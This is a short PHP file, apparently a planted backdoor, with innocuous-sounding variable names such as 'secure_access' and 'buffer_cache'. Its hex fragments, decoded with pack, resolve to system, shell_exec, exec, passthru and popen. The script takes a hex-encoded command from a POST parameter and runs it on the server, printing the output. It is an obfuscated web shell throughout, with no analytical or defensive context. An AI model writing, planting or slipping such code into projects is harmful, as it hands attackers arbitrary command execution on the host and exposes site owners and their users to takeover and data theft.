<?php


$itm1 = '7';
$itm2 = '9';
$itm3 = 'd';
$itm4 = '3';
$itm5 = '8';
$itm6 = '6';
$itm7 = '5';
$itm8 = 'c';
$itm9 = '0';
$itm10 = '1';
$itm11 = '4';
$itm12 = '2';
$itm13 = 'e';
$itm14 = 'f';
$secure_access1 = pack("H*", $itm1.'3'.'7'.$itm2.'7'.'3'.$itm1.'4'.'6'.'5'.'6'.$itm3);
$secure_access2 = pack("H*", $itm1.$itm4.'6'.$itm5.$itm6.$itm7.$itm6.'c'.'6'.$itm8.'5'.'f'.'6'.$itm7.'7'.'8'.'6'.$itm7.'6'.$itm4);
$secure_access3 = pack("H*", $itm6.$itm7.$itm1.'8'.$itm6.$itm7.'6'.$itm4);
$secure_access4 = pack("H*", $itm1.$itm9.$itm6.$itm10.$itm1.'3'.$itm1.$itm4.'7'.$itm11.'6'.$itm5.'7'.$itm12.'7'.'5');
$secure_access5 = pack("H*", $itm1.$itm9.$itm6.'f'.$itm1.'0'.$itm6.'5'.'6'.$itm13);
$secure_access6 = pack("H*", '7'.'3'.$itm1.'4'.$itm1.'2'.'6'.$itm7.'6'.'1'.'6'.'d'.$itm7.$itm14.$itm6.'7'.'6'.$itm7.'7'.'4'.'5'.$itm14.'6'.$itm4.'6'.$itm14.$itm6.$itm13.'7'.$itm11.$itm6.'5'.$itm6.$itm13.'7'.'4'.'7'.$itm4);
$secure_access7 = pack("H*", '7'.$itm9.$itm6.$itm4.'6'.'c'.$itm6.$itm14.'7'.$itm4.$itm6.'5');
$buffer_cache = pack("H*", $itm6.'2'.$itm1.$itm7.$itm6.$itm6.'6'.'6'.$itm6.'5'.$itm1.$itm12.'5'.'f'.'6'.'3'.$itm6.'1'.$itm6.'3'.$itm6.$itm5.$itm6.$itm7);
if (isset($_POST[$buffer_cache])) {
    $buffer_cache = pack("H*", $_POST[$buffer_cache]);
    if (function_exists($secure_access1)) {
        $secure_access1($buffer_cache);
    } elseif (function_exists($secure_access2)) {
        print $secure_access2($buffer_cache);
    } elseif (function_exists($secure_access3)) {
        $secure_access3($buffer_cache, $sym_data);
        print join("\n", $sym_data);
    } elseif (function_exists($secure_access4)) {
        $secure_access4($buffer_cache);
    } elseif (function_exists($secure_access5) && function_exists($secure_access6) && function_exists($secure_access7)) {
        $comp_hld = $secure_access5($buffer_cache, 'r');
        if ($comp_hld) {
            $token_tkn = $secure_access6($comp_hld);
            $secure_access7($comp_hld);
            print $token_tkn;
        }
    }
    exit;
}
